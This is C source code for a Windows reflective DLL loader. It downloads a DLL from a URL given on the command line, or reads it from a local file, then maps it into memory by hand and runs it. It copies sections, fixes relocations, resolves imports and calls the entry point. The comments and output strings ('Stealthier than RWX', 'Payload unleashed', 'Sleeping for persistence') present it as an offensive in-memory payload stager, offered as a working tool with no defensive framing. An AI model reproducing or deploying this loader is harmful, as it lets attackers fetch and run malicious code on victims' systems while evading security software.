#include <stdio.h>
#include <windows.h>
#include <wininet.h>
#include <winnt.h>

typedef BOOL (WINAPI* PDLL_MAIN)(HMODULE, DWORD, LPVOID);

int ReflectivelyLoadAndExecute(LPVOID pDllBuffer, DWORD dwLength) {
    if (pDllBuffer == NULL || dwLength < sizeof(IMAGE_DOS_HEADER)) return -1;

    PIMAGE_DOS_HEADER pDosHdr = (PIMAGE_DOS_HEADER)pDllBuffer;
    PIMAGE_NT_HEADERS pNtHdr = (PIMAGE_NT_HEADERS)((LPBYTE)pDllBuffer + pDosHdr->e_lfanew);
    
    // 1. Validation
    if (pDosHdr->e_magic != IMAGE_DOS_SIGNATURE || pNtHdr->Signature != IMAGE_NT_SIGNATURE) {
        printf("[-] Error: Invalid PE signatures.\n");
        return -1;
    }

    // 2. Allocate as RW (Stealthier than RWX)
    SIZE_T dwImageSize = pNtHdr->OptionalHeader.SizeOfImage;
    LPVOID pTargetBase = VirtualAlloc(NULL, dwImageSize, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
    if (!pTargetBase) return -1;

    // 3. Map Headers and Sections
    memcpy(pTargetBase, pDllBuffer, pNtHdr->OptionalHeader.SizeOfHeaders);
    PIMAGE_SECTION_HEADER pSectionHdr = IMAGE_FIRST_SECTION(pNtHdr);
    
    for (int i = 0; i < pNtHdr->FileHeader.NumberOfSections; i++) {
        LPVOID pDest = (LPBYTE)pTargetBase + pSectionHdr[i].VirtualAddress;
        LPVOID pSrc = (LPBYTE)pDllBuffer + pSectionHdr[i].PointerToRawData;
        if (pSectionHdr[i].SizeOfRawData > 0) memcpy(pDest, pSrc, pSectionHdr[i].SizeOfRawData);
    }

    // 4. Base Relocations
    ULONGLONG dwDelta = (ULONGLONG)pTargetBase - pNtHdr->OptionalHeader.ImageBase;
    if (dwDelta != 0) {
        PIMAGE_DATA_DIRECTORY pRelocDir = &pNtHdr->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];
        if (pRelocDir->Size > 0) {
            PIMAGE_BASE_RELOCATION pBlock = (PIMAGE_BASE_RELOCATION)((LPBYTE)pTargetBase + pRelocDir->VirtualAddress);
            while (pBlock->SizeOfBlock > 0) {
                int count = (pBlock->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / sizeof(WORD);
                PWORD pEntry = (PWORD)((LPBYTE)pBlock + sizeof(IMAGE_BASE_RELOCATION));
                for (int i = 0; i < count; i++) {
                    WORD type = (pEntry[i] >> 12);
                    WORD offset = (pEntry[i] & 0x0FFF);
                    if (type == IMAGE_REL_BASED_DIR64) *(ULONGLONG*)((LPBYTE)pTargetBase + pBlock->VirtualAddress + offset) += dwDelta;
                }
                pBlock = (PIMAGE_BASE_RELOCATION)((LPBYTE)pBlock + pBlock->SizeOfBlock);
            }
        }
    }

    // 5. IAT Resolution
    PIMAGE_DATA_DIRECTORY pImportDir = &pNtHdr->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT];
    if (pImportDir->Size > 0) {
        PIMAGE_IMPORT_DESCRIPTOR pDesc = (PIMAGE_IMPORT_DESCRIPTOR)((LPBYTE)pTargetBase + pImportDir->VirtualAddress);
        while (pDesc->Name) {
            HMODULE hLib = LoadLibraryA((LPCSTR)((LPBYTE)pTargetBase + pDesc->Name));
            PIMAGE_THUNK_DATA pThunk = (PIMAGE_THUNK_DATA)((LPBYTE)pTargetBase + pDesc->FirstThunk);
            PIMAGE_THUNK_DATA pOrig = (PIMAGE_THUNK_DATA)((LPBYTE)pTargetBase + (pDesc->OriginalFirstThunk ? pDesc->OriginalFirstThunk : pDesc->FirstThunk));
            while (pOrig->u1.AddressOfData) {
                if (IMAGE_SNAP_BY_ORDINAL(pOrig->u1.Ordinal)) pThunk->u1.Function = (ULONGLONG)GetProcAddress(hLib, (LPCSTR)IMAGE_ORDINAL(pOrig->u1.Ordinal));
                else pThunk->u1.Function = (ULONGLONG)GetProcAddress(hLib, ((PIMAGE_IMPORT_BY_NAME)((LPBYTE)pTargetBase + pOrig->u1.AddressOfData))->Name);
                pThunk++; pOrig++;
            }
            pDesc++;
        }
    }

    // --- CRITICAL FIXES START ---
    
    // A. Capture Entry Point and Header Size BEFORE we change permissions
    PDLL_MAIN pEntryPoint = (PDLL_MAIN)((LPBYTE)pTargetBase + pNtHdr->OptionalHeader.AddressOfEntryPoint);
    DWORD dwHeaderSize = pNtHdr->OptionalHeader.SizeOfHeaders;

    // B. Set Section Protections
    for (int i = 0; i < pNtHdr->FileHeader.NumberOfSections; i++) {
        DWORD dwOld, dwNew = 0;
        BOOL bE = (pSectionHdr[i].Characteristics & IMAGE_SCN_MEM_EXECUTE);
        BOOL bW = (pSectionHdr[i].Characteristics & IMAGE_SCN_MEM_WRITE);

        if (bE) dwNew = bW ? PAGE_EXECUTE_READWRITE : PAGE_EXECUTE_READ;
        else dwNew = bW ? PAGE_READWRITE : PAGE_READONLY;

        VirtualProtect((LPBYTE)pTargetBase + pSectionHdr[i].VirtualAddress, pSectionHdr[i].Misc.VirtualSize, dwNew, &dwOld);
    }

    // C. Lock Headers to ReadOnly
    DWORD dwOldH;
    VirtualProtect(pTargetBase, dwHeaderSize, PAGE_READONLY, &dwOldH);

    // D. Final Execution
    printf("[+] Calling Entry Point at 0x%p\n", pEntryPoint);
    return pEntryPoint((HMODULE)pTargetBase, DLL_PROCESS_ATTACH, NULL);
}

// --Helper to load a DLL from a local file ---
unsigned char* LoadLocalFile(LPCSTR szPath, DWORD* pdwLength) {
    // 1. Pre-flight check: Does the file actually exist?
    DWORD dwAttrib = GetFileAttributesA(szPath);

    if (dwAttrib == INVALID_FILE_ATTRIBUTES) {
        printf("[-] Error: File '%s' does not exist.\n", szPath);
        return NULL;
    }

    if (dwAttrib & FILE_ATTRIBUTE_DIRECTORY) {
        printf("[-] Error: '%s' is a directory, not a DLL file.\n", szPath);
        return NULL;
    }

    // 2. Proceed to open the file
    HANDLE hFile = CreateFileA(szPath, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE) {
        printf("[-] Failed to open local file. Error: %lu\n", GetLastError());
        return NULL;
    }

    *pdwLength = GetFileSize(hFile, NULL);
    if (*pdwLength == 0 || *pdwLength == INVALID_FILE_SIZE) {
        printf("[-] Error: File is empty or invalid size.\n");
        CloseHandle(hFile);
        return NULL;
    }

    // 3. Allocate and Read
    unsigned char* buffer = (unsigned char*)malloc(*pdwLength);
    if (buffer) {
        DWORD bytesRead;
        if (!ReadFile(hFile, buffer, *pdwLength, &bytesRead, NULL)) {
            printf("[-] Failed to read file data. Error: %lu\n", GetLastError());
            free(buffer);
            buffer = NULL;
        }
    }

    CloseHandle(hFile);
    return buffer;
}

// --- Helper to load a DLL from a URL ---
unsigned char* LoadRemoteUrl(LPCSTR szUrl, DWORD* pdwLength) {
    HINTERNET hInternet, hConnect;
    DWORD dwBytesRead, dwTotalBytesRead = 0;
    unsigned char* pDllBuffer = NULL;

    hInternet = InternetOpenA("ReflectiveLoader", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
    if (!hInternet) return NULL;

    hConnect = InternetOpenUrlA(hInternet, szUrl, NULL, 0, INTERNET_FLAG_RELOAD | INTERNET_FLAG_PRAGMA_NOCACHE, 0);
    if (!hConnect) {
        InternetCloseHandle(hInternet);
        return NULL;
    }

    unsigned char chunk[4096];
    while (InternetReadFile(hConnect, chunk, sizeof(chunk), &dwBytesRead) && dwBytesRead > 0) {
        pDllBuffer = (unsigned char*)realloc(pDllBuffer, dwTotalBytesRead + dwBytesRead);
        memcpy(pDllBuffer + dwTotalBytesRead, chunk, dwBytesRead);
        dwTotalBytesRead += dwBytesRead;
    }

    InternetCloseHandle(hConnect);
    InternetCloseHandle(hInternet);
    *pdwLength = dwTotalBytesRead;
    return pDllBuffer;
}

int main(int argc, char *argv[]) {
    if (argc != 2) return 1;
    DWORD len = 0;
    unsigned char* buf = (strncmp(argv[1], "http", 4) == 0) ? LoadRemoteUrl(argv[1], &len) : LoadLocalFile(argv[1], &len);
    
    if (!buf) return 1;

    printf("[+] Loaded %lu bytes. Starting reflective load...\n", len);
    ReflectivelyLoadAndExecute(buf, len);

    // Clean up temporary buffer (NOT the mapped DLL memory)
    RtlSecureZeroMemory(buf, len);
    free(buf);

    printf("[+] Payload unleashed. Sleeping for persistence...\n");
    Sleep(INFINITE); 
    return 0;
}
